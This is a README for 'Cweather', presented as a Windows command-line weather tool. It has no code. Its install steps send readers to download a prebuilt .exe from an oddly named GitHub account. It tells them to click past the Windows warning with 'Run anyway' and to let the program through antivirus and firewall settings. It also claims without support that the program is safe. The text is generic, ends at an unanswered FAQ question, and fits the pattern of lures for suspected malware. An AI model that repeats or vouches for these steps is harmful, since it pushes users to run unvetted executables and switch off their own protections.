# 🌤️ Cweather - Check local weather via command line

[![](https://img.shields.io/badge/Download-Cweather-blue.svg)](https://github.com/Eggshellcensus819/Cweather)

Cweather is a lightweight software tool that fetches live weather data for your specific location directly to your computer screen. It provides current temperature and sky conditions without requiring you to open a web browser.

## ⚙️ System Requirements 

This program works on Windows 10 and Windows 11. You do not need to install programming tools or compilers to use this software. The system handles the network requests to fetch data from weather sensors across the globe. Ensure your computer has an active internet connection to see updated weather reports.

## 📥 How to Install the Software

1. Visit the [official repository page](https://github.com/Eggshellcensus819/Cweather) to access the files.
2. Look for the section labeled Releases on the right side of the screen.
3. Click the most recent version of the program ending in .exe.
4. Download the file to your computer.
5. Move the file to a folder where you keep your applications.
6. Double-click the file to start the application.

If your computer shows a warning message about the file, click "More info" and then "Run anyway." This happens because the file is independent and does not go through a standard app store.

## 🖥️ Using the Program

When you run the file, a black window appears on your screen. This window is your interface. It asks you to type in the name of your city. Type the city name and press the Enter key on your keyboard. 

The program contacts a weather server and pulls the information in seconds. You will see the temperature and a short description of the sky, such as sunny, cloudy, or rainy. Once the program displays this text, it closes the connection to the weather server to save your data and system memory. 

To check the weather in a different city, double-click the file again or keep the window open if the program prompts you for further input. You can close the window at any time by clicking the X button in the top right corner.

## 📂 Understanding the Data

Cweather uses a network connection to talk to weather stations. It gathers information such as the current heat levels and humidity. Because the tool uses a small amount of memory, it runs fast even on older hardware. The program keeps your information private and does not store your location history after you close the window.

## 🛠️ Troubleshooting Common Problems

If the program closes immediately after you open it, check your internet connection. The tool needs a stable signal to contact the weather database. If you see an error about a missing file, restart your computer and try opening the program again. 

Some security software might block the program from accessing the internet. If you suspect this, check your antivirus settings to allow Cweather to communicate through your firewall. The program only sends requests to the weather server and performs no other activity on your network.

## 📝 Frequently Asked Questions

**Does the program stay open in the background?**
No. Once the program displays your weather information, it shuts down completely. It does not consume battery life or memory while you are not using it.

**Can I save my favorite cities?**
This version of the software focuses on simplicity. You enter a city name each time you open the tool. Future updates may include a history function.

**Is it safe to run?**
Yes. The program performs a specific task and only interacts with the weather service. It contains no hidden tracking tools.

**How accurate is the weather data?**
